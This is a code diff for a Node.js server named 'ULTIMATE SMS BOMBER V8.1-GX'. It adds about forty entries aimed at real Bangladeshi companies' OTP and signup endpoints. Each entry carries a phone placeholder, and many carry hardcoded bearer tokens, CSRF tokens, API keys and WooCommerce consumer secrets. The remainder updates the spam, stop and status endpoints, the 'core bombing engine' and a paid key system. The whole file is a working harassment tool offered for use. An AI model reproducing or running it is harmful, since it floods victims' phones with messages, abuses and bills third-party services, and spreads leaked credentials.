+    headers: { "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc", "Content-Type": "application/json" }, insecure: true },
+
+  { id: 510, name: "PHP-10 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
+    isFormData: true,
+    body: { mobile: "{phone}", fcmToken: "", referral: "" },
+    headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.arogga.com", "referer": "https://www.arogga.com/" } },
+
+  { id: 511, name: "PHP-11 Cinematic GP", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}",
+    body: { headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri" } },
+    headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "origin": "https://cinematic.mobi", "referer": "https://cinematic.mobi/" } },
+
+  { id: 512, name: "PHP-12 BDStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/",
+    isFormData: true,
+    body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" } },
+
+  { id: 513, name: "PHP-13 BCS Examaid", method: "POST", url: "https://bcsexamaid.com/api/generateotp",
+    body: { mobile: "{phone}", softtoken: "Rifat.Admin.2022" },
+    headers: { "User-Agent": "Dart/3.1 (dart:io)", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8" } },
+
+  { id: 514, name: "PHP-14 DoctorLiveBD", method: "POST", url: "https://doctorlivebd.com/api/patient/auth/otpsend",
+    isFormData: true,
+    body: { country_code: "880", mobile: "{phone_10}" },
+    headers: { "User-Agent": "okhttp/4.10.0", "Content-Type": "application/x-www-form-urlencoded" } },
+
+  { id: 515, name: "PHP-15 Sheba GenerateToken", method: "GET", url: "https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD", dynamicToken: true },
+  { id: 516, name: "PHP-15 Sheba ShootOTP", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp",
+    body: { mobile: "+88{phone}", app_id: "8329815A6D1AE6DD", api_token: "{token}" },
+    requiresToken: true,
+    headers: { "Content-Type": "application/json" } },
+
+  { id: 517, name: "PHP-16 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login",
+    body: { phoneNumber: "{phone}" },
+    headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://apex4u.com", "referer": "https://apex4u.com/" } },
+
+  { id: 518, name: "PHP-17 Sindabad", method: "POST", url: "https://offers.sindabad.com/api/mobile-otp",
+    body: { key: "c94e67fb2a59af3b6fa21f24463b2061", mobile: "+88{phone}" },
+    headers: { "accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sindabad.com", "Referer": "https://sindabad.com/" } },
+
+  { id: 519, name: "PHP-18 KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp",
+    body: { email: "{phone}" },
+    headers: { "Content-Type": "application/json", "x-xsrf-token": "eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cUE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0=" }, insecure: true },
+
+  { id: 520, name: "PHP-19 Shikho v2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms",
+    body: { phone: "{phone}", type: "student", auth_type: "signup", vendor: "shikho" },
+    headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://app.shikho.com", "Referer": "https://app.shikho.com/" } },
+
+  { id: 521, name: "PHP-20 Circle Reseller", method: "POST", url: "https://reseller.circle.com.bd/api/v2/auth/signup",
+    body: { name: "+88{phone}", email_or_phone: "+88{phone}", password: "123456", password_confirmation: "123456", register_by: "phone" },
+    headers: { "Content-Type": "application/json" }, insecure: true },
+
+  { id: 522, name: "PHP-21 BDTickets Auth", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth",
+    body: { createUserCheck: true, phoneNumber: "+88{phone}", applicationChannel: "WEB_APP" },
+    headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://bdtickets.com", "referer": "https://bdtickets.com/" } },
+
+  { id: 523, name: "PHP-22 GP FWA OTP", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
+    body: { phone: "{phone}", email: "", language: "en" },
+    headers: { "Content-Type": "application/json" } },
+
+  { id: 524, name: "PHP-23 RFL BestBuy", method: "POST", url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
+    body: { company_id: "26", password2: "Riyaz@123", currency_code: "BDT", user_type: "C", email: "{phone}@gmail.com", g_id: "", lang_code: "en", operating_system: "Android", otp_verify: false, password1: "Riyaz@123", phone: "{phone}", storefront_id: "3" },
+    headers: { "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json" } },
+
+  { id: 525, name: "PHP-24 Chorki Mobile", method: "POST", url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
+    body: { number: "{phone}" },
+    headers: { "User-Agent": "Chorki/2.0.33 (Android 13; GM1917; GM1917; arm64-v8a)", "Content-Type": "application/json" } },
+
+  { id: 526, name: "PHP-25 HishabExpress", method: "POST", url: "https://api.hishabexpress.com/login/status",
+    isFormData: true,
+    body: { msisdn: "{phone}", hash: "Hello" },
+    headers: { "User-Agent": "Dart/2.19 (dart:io)", "Content-Type": "application/x-www-form-urlencoded" }, insecure: true },
+
+  { id: 527, name: "PHP-26 Chorcha", method: "GET", url: "https://mujib.chorcha.net/auth/check?phone={phone}",
+    headers: { "x-chorcha-mode": "prod", "x-chorcha-platform": "web" } },
+
+  { id: 528, name: "PHP-27 Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
+
+  { id: 529, name: "PHP-28 Robi Register", method: "POST", url: "https://webapi.robi.com.bd/v1/account/register/otp",
+    body: { phone_number: "{phone}" },
+    headers: { "X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0", "Content-Type": "application/json" }, insecure: true },
+
+  { id: 530, name: "PHP-29 Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send",
+    body: { phone: "{phone}", otp_type: "login" },
+    headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://chardike.com", "referer": "https://chardike.com/" } },
+
+  { id: 531, name: "PHP-30 eTestPaper Exists", method: "POST", url: "https://prod.etestpaper.net/api/exists",
+    body: { phone: "{phone}" },
+    headers: { "content-type": "application/json", "origin": "https://www.etestpaper.net", "referer": "https://www.etestpaper.net/" } },
+
+  { id: 532, name: "PHP-30 eTestPaper OTP", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp",
+    body: { phone: "{phone}", recaptcha: "668be73dcad2999a957ff440" },
+    headers: { "content-type": "application/json", "origin": "https://www.etestpaper.net", "referer": "https://www.etestpaper.net/" } },
+
+  { id: 533, name: "PHP-31 GPay CheckSignup", method: "POST", url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
+    body: { deviceId: "35{phone}30", msisdn: "{phone}", tran_type: "OTPREQSIGNUP" },
+    headers: { "Content-Type": "application/json" } },
+
+  { id: 534, name: "PHP-32 AppLink OTP", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
+    body: { msisdn: "88{phone}" },
+    headers: { "content-type": "application/json", "origin": "https://applink.com.bd", "referer": "https://applink.com.bd/" }, insecure: true },
+
+  { id: 535, name: "PHP-33 Priyo Shikkhaloy", method: "POST", url: "https://app.priyoshikkhaloy.com/api/user/register-login.php",
+    isFormData: true,
+    body: { mobile: "{phone}" },
+    headers: { "User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded" }, insecure: true },
+
+  { id: 536, name: "PHP-34 Kabbik OTP", method: "POST", url: "https://api.kabbik.com/v1/auth/otpnew",
+    body: { msisdn: "88{phone}", currentTimeLong: "currentTime", passKey: "qOQNBtVmoTTPVmfn" },
+    dynamicFields: true,
+    headers: { "content-type": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc", "origin": "https://kabbik.com", "referer": "https://kabbik.com/" }, insecure: true },
+
+  { id: 537, name: "PHP-35 Salextra", method: "POST", url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
+    isFormData: true,
+    body: { username: "{phone}", loginType: "MOBILE", __RequestVerificationToken: "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg" },
+    headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://salextra.com.bd", "referer": "https://salextra.com.bd/register?returnUrl=%2F", "x-requested-with": "XMLHttpRequest" } },
+
+  { id: 538, name: "PHP-36 Sundora Customer", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/",
+    body: { customer: { email: "kgjkgjgg{phone}@gmail.com", password: "#bUV?'3*N#7N}.g", password_confirmation: "#bUV?'3*N#7N}.g", phone: "+880{phone_10}", draft_order_id: null, first_name: "sdfgfd", last_name: "fgfd", note: { birthday: "", gender: "male" }, withTimeout: true, newsletter_email: true, newsletter_sms: true } },
+    headers: { "content-type": "application/json", "My-Location": "BD", "origin": "https://sundora.com.bd", "referer": "https://sundora.com.bd/" } },
+
+  { id: 539, name: "PHP-37 Cinematic SBENT", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
+    body: { accessinfo: { access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", referenceCode: "20190827042622" } },
+    headers: { "Content-Type": "application/json" }, insecure: true },
+
+  { id: 540, name: "PHP-38 BajiStar OTP", method: "GET", url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}",
+    headers: { "Origin": "https://www.playbajistar.com", "Referer": "https://www.playbajistar.com/" } },
+
+  { id: 541, name: "PHP-39 DocTime", method: "POST", url: "https://api.doctime.com.bd/api/authenticate",
+    body: { contact_no: "{phone}", country_calling_code: "88" },
+    headers: { "User-Agent": "okhttp/4.12.0", "Content-Type": "application/json", "app-version": "0.29.11", "device-brand": "Genymobile", "platform": "Android", "device-model": "Galaxy S4", "os-version": "11", "locale": "bn" }, insecure: true },
+
+  { id: 542, name: "PHP-40 WebloginDA GP", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp",
+    isFormData: true,
+    body: { msisdn: "{phone}" },
+    headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://gpfi.grameenphone.com", "Referer": "https://gpfi.grameenphone.com/" } },
+
+  { id: 543, name: "PHP-41 Meenabazar OTP", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login",
+    headers: { "User-Agent": "Dart/3.2 (dart:io)", "content-type": "application/json" } },
+
+  { id: 544, name: "PHP-42 MedEasy OTP", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/",
+    headers: { "accept": "application/json", "origin": "https://medeasy.health", "referer": "https://medeasy.health/" } },
+
+  { id: 545, name: "PHP-43 Iqra Live", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", insecure: true },
+
+  { id: 546, name: "PHP-44 Chokrojan Passenger", method: "POST", url: "https://chokrojan.com/api/v1/passenger/login/mobile",
+    body: { mobile_number: "{phone}", otp_token: "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7" },
+    headers: { "Authorization": "Bearer null", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://chokrojan.com", "Referer": "https://chokrojan.com/login", "company-id": "1", "domain-name": "chokrojan.com", "user-platform": "3" }, insecure: true },
+
+  { id: 547, name: "PHP-45 Shomvob OTP", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
+    body: { phone: "88{phone}" },
+    headers: { "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s", "Content-Type": "application/json; charset=utf-8" } },
+
+  { id: 548, name: "PHP-46 RedX v2", method: "POST", url: "https://api.redx.com.bd/v1/user/signup",
+    body: { name: "Alamin Sheikh", phoneNumber: "{phone}", service: "redx" },
+    headers: { "Content-Type": "application/json" }, insecure: true },
+
+  { id: 549, name: "PHP-47 Cinematic Common", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
+    headers: { "Content-Type": "application/json" }, insecure: true },
+
+  { id: 550, name: "PHP-48 MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
+    body: { firstName: "randomName", lastName: "", gender: "M", email: "randomEmail", userName: "{phone}", password: "Kamrul12345@", confirmPassword: "Kamrul12345@", status: 0, mobile: "{phone}", workAreaCategory: 2, createdFrom: 0, createdAt: "now", decodeId: "", catTypeId: 1, userNameType: "mobile", disabilityId: "", deviceTypeId: 0, countryCode: "88", socialMediaId: "", socialMediaName: "", socialMediaTimestamp: "now", ttcId: "", gradeId: "", knownBy: "", isTtc: false, trainingCenterName: "", trainingDistrict: "", queryString: "", campaignId: 0, campaignSource: "", campaignReferer: "", isFromSocialMedia: false, isActive: 0, useType: "", uNtype: 0 },
+    dynamicFields: true,
+    headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://mybdjobs.bdjobs.com", "referer": "https://mybdjobs.bdjobs.com/" } }
 ];
 
 // ---- ORIGINAL BD APIS ----
@@ -1122,14 +721,6 @@ class RateLimiter {
     this.requests.set(identifier, arr);
     return arr.length <= max;
   }
-  getRemaining(identifier) {
-    const now = Date.now();
-    const w = CONFIG.security.rateLimit.windowMs;
-    const max = CONFIG.security.rateLimit.maxRequests;
-    if (!this.requests.has(identifier)) return max;
-    const arr = this.requests.get(identifier).filter(t => now - t < w);
-    return Math.max(0, max - arr.length);
-  }
 }
 
 // ============================================================
@@ -1144,6 +735,7 @@ app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false 
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.static(path.join(__dirname, '../public')));
 
 app.use((req, res, next) => {
   req.requestId = Utility.generateId();
@@ -1165,25 +757,28 @@ app.use((req, res, next) => {
 // ENDPOINTS
 // ============================================================
 app.get('/', (req, res) => {
-  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.0 running', endpoints: {
-    info: '/api', spam: '/api/spam?number=01700000000&count=1',
-    stop: '/api/stop?all=true', pause: '/api/pause?all=true', resume: '/api/resume?all=true',
-    status: '/api/status', stats: '/api/stats', alllist: '/api/alllist',
-    apistats: '/api/api-stats', health: '/api/health',
-    createKey: '/api/expiredate=30&createkey?plan=premium&days=30'
-  }});
+  const p = path.join(__dirname, '../public/index.html');
+  if (fs.existsSync(p)) return res.sendFile(p);
+  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.1 running' });
 });
 
 app.get('/api', (req, res) => {
   res.json({
-    developer: DEVELOPER_INFO, version: "8.0.0-FULL", total_apis: SMS_APIS.length,
-    plans: Object.keys(PLAN_CONFIG)
+    developer: DEVELOPER_INFO, version: "8.1.0-GX", total_apis: SMS_APIS.length,
+    plans: Object.keys(PLAN_CONFIG),
+    endpoints: {
+      spam: '/api/spam?number=01700000000&count=1',
+      stop: '/api/stop?all=true', pause: '/api/pause?all=true', resume: '/api/resume?all=true',
+      status: '/api/status', stats: '/api/stats', alllist: '/api/alllist',
+      apistats: '/api/api-stats', health: '/api/health',
+      createKey: '/api/expiredate=30&createkey?plan=premium&days=30'
+    }
   });
 });
 
 app.get('/api/health', (req, res) => {
   res.json({
-    status: 'active', developer: DEVELOPER_INFO, version: "8.0.0-FULL",
+    status: 'active', developer: DEVELOPER_INFO, version: "8.1.0-GX",
     uptime: process.uptime(), total_apis: SMS_APIS.length,
     active_jobs: bombController.activeJobs.size,
     memory: Utility.getMemoryUsage()
@@ -1289,7 +884,7 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-// -------- ALL LIST (NEW) --------
+// -------- ALL LIST --------
 app.get('/api/alllist', (req, res) => {
   const statsMap = new Map(apiStatsTracker.getAll().map(s => [s.id, s]));
   const list = SMS_APIS.map(api => {
@@ -1297,10 +892,6 @@ app.get('/api/alllist', (req, res) => {
     return {
       id: api.id, name: api.name, method: api.method,
       url: typeof api.url === 'string' ? api.url : '[dynamic]',
-      flags: {
-        shadowX: !!api.isShadowX, lmnx9: !!api.isLMNx9, gx: !!api.isGXSends,
-        formData: !!api.isFormData, insecure: !!api.insecure
-      },
       stats: {
         calls: s.calls, success: s.success, failed: s.failed,
         successRate: s.calls > 0 ? ((s.success / s.calls) * 100).toFixed(2) + '%' : '0%',
@@ -1317,7 +908,7 @@ app.get('/api/alllist', (req, res) => {
   });
 });
 
-// -------- API-STATS (NEW) --------
+// -------- API-STATS --------
 app.get('/api/api-stats', (req, res) => {
   res.json({
     success: true, developer: DEVELOPER_INFO,
@@ -1354,7 +945,6 @@ app.use((err, req, res, next) => {
 // CORE BOMBING ENGINE
 // ============================================================
 function buildDynamicBody(api, phone) {
-  // Handle dynamic-generated fields (Proiojon, MyBDJobs, Kabbik)
   const rand = Utility.randomString(10);
   const randName = Utility.randomName();
   const randEmail = randName.toLowerCase() + rand + '@gmail.com';
@@ -1371,7 +961,7 @@ function buildDynamicBody(api, phone) {
     if (typeof obj === 'string') {
       return obj
         .replace(/{phone}/g, phone)
-        .replace(/{phone_e164}/g, phone)
+        .replace(/{phone_e164}/g, Utility.normalizeBD(phone))
         .replace(/{phone_10}/g, phone.slice(-10))
         .replace(/{count}/g, 1)
         .replace(/randomName/g, randName)
@@ -1486,10 +1076,11 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
 // START SERVER
 // ============================================================
 const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
-  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.0`);
+  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.1-GX`);
   console.log(`📡 PID: ${process.pid}`);
   console.log(`🌐 Port: ${CONFIG.server.port}`);
   console.log(`📊 Total APIs: ${SMS_APIS.length}`);
+  console.log(`🎯 GX Sends: ENABLED (single API mode)`);
   console.log(`🔑 Keys loaded: ${keyManager.getAllKeys().length}`);
   console.log(`\n✅ Server ready!\n`);
 });
